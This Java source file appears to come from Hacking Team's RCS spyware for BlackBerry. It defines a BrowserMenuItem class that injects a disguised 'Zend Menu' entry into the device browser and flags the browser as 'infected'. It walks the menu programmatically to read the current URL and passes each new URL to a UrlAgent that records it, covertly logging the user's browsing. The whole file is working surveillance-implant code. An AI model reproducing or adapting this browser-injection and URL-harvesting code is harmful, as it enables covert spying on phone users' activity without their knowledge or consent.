//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.agent.url;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.UrlAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class BrowserMenuItem extends ApplicationMenuItem {
    private static final String BROWSER_MENU = "Zend Menu";
    //#ifdef DEBUG
    private static Debug debug = new Debug("BrowserMenuItem",
            DebugLevel.VERBOSE);
    //#endif
    static BrowserMenuItem instance;

    Screen browserScreen;
    String lastUrl;

    Thread menuThread;
    UrlAgent agent;

    public static BrowserMenuItem getInstance() {
        if (instance == null)
            instance = new BrowserMenuItem(20);

        return instance;
    }

    public BrowserMenuItem(int arg0) {
        super(arg0);
    }

    /**
     * Viene chiamato quando viene premuto il menu Si esegue nel contesto
     * dell'applicazione
     */

    public Object run(Object context) {
        try {

            //#ifdef DEBUG
            debug.init();
            debug.trace("run in context");
            //#endif

            if (browserScreen == null) {
                //#ifdef DEBUG
                debug.info("run: init Browser Screen");
                //#endif
                UiApplication app = UiApplication.getUiApplication();
                browserScreen = app.getActiveScreen();

                //#ifdef DEBUG
                debug.trace("run browserScreen: " + browserScreen);
                //#endif
                
                AppInjectorBrowser.getInstance().setInfected();
            }

            if (context == null) {
                //#ifdef DEBUG
                debug.trace("NO URL: " + context);
                //#endif
                return null;
            }

            String url = (String) context;

            urlManagement(url);

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.warn("injectBrowser:" + ex.toString());
            //#endif
        }
        return null;
    }

    public String toString() {
        return BROWSER_MENU;
    }

    boolean menuAdded = false;

    public void addMenuBrowser() {
        if (!menuAdded) {
            //#ifdef DEBUG
            debug.trace("Adding menu browser");
            //#endif
            long bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
            ApplicationMenuItemRepository.getInstance()
                    .addMenuItem(bbmid, this);
            menuAdded = true;
        }
    }

    public void removeMenuBrowser() {
        if (menuAdded) {
            //#ifdef DEBUG
            debug.trace("Removing menu browser");
            //#endif
            long bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;
            ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid,
                    this);
            menuAdded = false;
        }
    }

    public void urlManagement(String url) {
        if (!url.equals(lastUrl)) {
            lastUrl = url;
            //#ifdef DEBUG
            debug.info("NEW URL: " + url);
            //#endif

            if (agent == null) {
                agent = UrlAgent.getInstance();
            }

            agent.saveUrl(url);
        } else {
            //#ifdef DEBUG
            debug.trace("callMenuInContext: same url");
            //#endif
        }
    }

    public void callMenuInContext() {
        //#ifdef DEBUG
        debug.trace("whatever");
        //#endif
        if (browserScreen != null) {
            addMenuBrowser();
            Utils.sleep(200);
            MenuWalker.walk(BROWSER_MENU, browserScreen, false);
            Utils.sleep(200);
            removeMenuBrowser();
        } else {
            //#ifdef DEBUG
            debug.trace("callMenuInContext: null browserScreen");
            //#endif
        }
    }
}
